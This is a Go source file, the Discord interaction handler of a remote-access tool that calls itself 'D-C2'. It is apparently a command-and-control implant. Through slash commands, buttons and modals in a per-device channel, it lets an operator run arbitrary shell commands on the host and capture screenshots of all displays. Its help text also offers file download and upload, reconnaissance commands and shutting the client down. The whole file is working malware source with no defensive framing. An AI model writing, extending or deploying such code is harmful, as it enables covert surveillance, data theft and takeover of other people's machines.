package main

import (
	"fmt"
	"runtime"

	"github.com/bwmarrin/discordgo"
)

func handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if i.ChannelID != myChannelId {
		return
	}

	switch i.Type {
	case discordgo.InteractionApplicationCommand:
		data := i.ApplicationCommandData()
		switch data.Name {
		case "help":
			content := "**D‑C2 Help**\n\n" +
				"Use these controls in this device channel:\n\n" +
				"**Slash commands**\n" +
				"/cmd `<command>`  – run shell command\n" +
				"/screenshot      – capture screenshots of all displays\n" +
				"/cwd             – show current working directory\n" +
				"/ls `[path]`      – list directory (current or given path)\n\n" +
				"**Emoji commands**\n" +
				"📸              – capture screenshots of all displays\n" +
				"👇 `<path>`      – download file from this machine (size < 8 MB)\n" +
				"☝️ `<path>` *attach – upload attached file to this path\n" +
				"💀              – terminate this client\n\n" +
				"**Buttons**\n" +
				"whoami    – show current user\n" +
				"id        – show user / UID information\n" +
				"hostname  – show device hostname\n" +
				"ip info   – show IP configuration\n" +
				"cwd       – show current working directory\n\n" +
				"Send `help` or `/help` anytime to show this help again."
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: content,
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
		case "cmd":
			var cmdStr string
			for _, opt := range data.Options {
				if opt.Name == "command" {
					cmdStr = opt.StringValue()
					break
				}
			}
			if cmdStr == "" {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "No command provided.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmdStr + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmdStr)
		case "screenshot":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "📸 Capturing screenshots...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			handleScreenshot(s, i.ChannelID, nil)
		case "cwd":
			cmd := "pwd"
			if runtime.GOOS == "windows" {
				cmd = "cd"
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmd + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmd)
		case "ls":
			var path string
			for _, opt := range data.Options {
				if opt.Name == "path" {
					path = opt.StringValue()
					break
				}
			}
			base := "ls"
			if runtime.GOOS == "windows" {
				base = "dir"
			}
			cmdStr := base
			if path != "" {
				cmdStr = base + " " + path
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmdStr + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmdStr)
		case "ps":
			cmdStr := "ps aux"
			if runtime.GOOS == "windows" {
				cmdStr = "tasklist"
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmdStr + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmdStr)
		case "pidinfo":
			var pidVal int64
			for _, opt := range data.Options {
				if opt.Name == "pid" {
					pidVal = opt.IntValue()
					break
				}
			}
			if pidVal <= 0 {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "Invalid PID.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			cmdStr := ""
			if runtime.GOOS == "windows" {
				cmdStr = fmt.Sprintf("tasklist /FI \"PID eq %d\"", pidVal)
			} else {
				cmdStr = fmt.Sprintf("ps -p %d -o pid,ppid,user,pcpu,pmem,etime,cmd", pidVal)
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmdStr + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmdStr)
		default:
		}
	case discordgo.InteractionMessageComponent:
		data := i.MessageComponentData()
		switch data.CustomID {
		case "d2c_screenshot":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "📸 Capturing screenshots...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			handleScreenshot(s, i.ChannelID, ref)
		case "d2c_run_cmd":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseModal,
				Data: &discordgo.InteractionResponseData{
					CustomID: "d2c_cmd_modal",
					Title:    "Run command",
					Components: []discordgo.MessageComponent{
						discordgo.ActionsRow{
							Components: []discordgo.MessageComponent{
								&discordgo.TextInput{
									CustomID:    "d2c_cmd_input",
									Label:       "Shell command",
									Style:       discordgo.TextInputShort,
									Placeholder: "whoami",
									Required:    true,
								},
							},
						},
					},
				},
			})
		case "d2c_ls":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseModal,
				Data: &discordgo.InteractionResponseData{
					CustomID: "d2c_ls_modal",
					Title:    "List directory",
					Components: []discordgo.MessageComponent{
						discordgo.ActionsRow{
							Components: []discordgo.MessageComponent{
								&discordgo.TextInput{
									CustomID:    "d2c_ls_input",
									Label:       "ls path",
									Style:       discordgo.TextInputShort,
									Placeholder: "/path",
									Value:       "ls ",
									Required:    true,
								},
							},
						},
					},
				},
			})
		case "d2c_q_cwd":
			cmd := "pwd"
			if runtime.GOOS == "windows" {
				cmd = "cd"
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmd + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, cmd)
		case "d2c_q_whoami":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `whoami`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, "whoami")
		case "d2c_q_id":
			cmd := "id"
			if runtime.GOOS == "windows" {
				cmd = "whoami /user"
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmd + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, cmd)
		case "d2c_q_hostname":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `hostname`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, "hostname")
		case "d2c_q_ip":
			cmd := "ip addr"
			if runtime.GOOS == "windows" {
				cmd = "ipconfig"
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmd + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, cmd)
		default:
		}
	case discordgo.InteractionModalSubmit:
		data := i.ModalSubmitData()
		switch data.CustomID {
		case "d2c_cmd_modal":
			var cmdStr string
			for _, row := range data.Components {
				ar, ok := row.(discordgo.ActionsRow)
				if !ok {
					continue
				}
				for _, c := range ar.Components {
					if input, ok := c.(*discordgo.TextInput); ok && input.CustomID == "d2c_cmd_input" {
						cmdStr = input.Value
					}
				}
			}
			if cmdStr == "" {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "No command provided.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmdStr + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmdStr)
		case "d2c_ls_modal":
			var cmdStr string
			for _, row := range data.Components {
				ar, ok := row.(discordgo.ActionsRow)
				if !ok {
					continue
				}
				for _, c := range ar.Components {
					if input, ok := c.(*discordgo.TextInput); ok && input.CustomID == "d2c_ls_input" {
						cmdStr = input.Value
					}
				}
			}
			if cmdStr == "" {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "No command provided.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmdStr + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmdStr)
		default:
		}
	default:
	}
}
